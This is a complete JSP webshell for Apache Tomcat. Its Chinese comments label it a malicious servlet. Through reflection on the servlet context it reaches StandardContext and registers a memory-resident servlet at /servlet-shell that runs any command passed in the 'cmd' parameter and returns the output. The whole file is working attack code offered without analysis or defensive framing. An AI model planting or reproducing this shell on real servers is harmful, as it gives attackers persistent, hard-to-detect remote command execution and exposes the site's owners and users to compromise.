<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.*" %>
<%@ page import="org.apache.catalina.core.*" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
    // 定义一个恶意servlet
    public class ShellServlet extends HttpServlet {
        @Override
        public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
            String cmd = request.getParameter("cmd");
            if (cmd != null) {
                Process process = Runtime.getRuntime().exec(cmd);
                BufferedReader bufferedReader = new BufferedReader(
                        new InputStreamReader(process.getInputStream()));
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    response.getWriter().println(line);
                }
            }
        }
    }
%>
<%
    // 从request中获取servletContext
    ServletContext servletContext = request.getServletContext();

    // 从servletContext中获取applicationContext
    Field applicationContextField = servletContext.getClass().getDeclaredField("context");
    applicationContextField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);
    // 从applicationContext中获取standardContext
    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

    // 从context获取Wrapper对象
    Wrapper wrapper = standardContext.createWrapper();

    // 将自己的Servlet封装进wrapper对象
    wrapper.setName("servlet-shell");
    wrapper.setServletClass(ShellServlet.class.getName());
    wrapper.setServlet(new ShellServlet());

    // 将wrapper添加到上下文并设置映射路径
    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded("/servlet-shell", "servlet-shell");
%>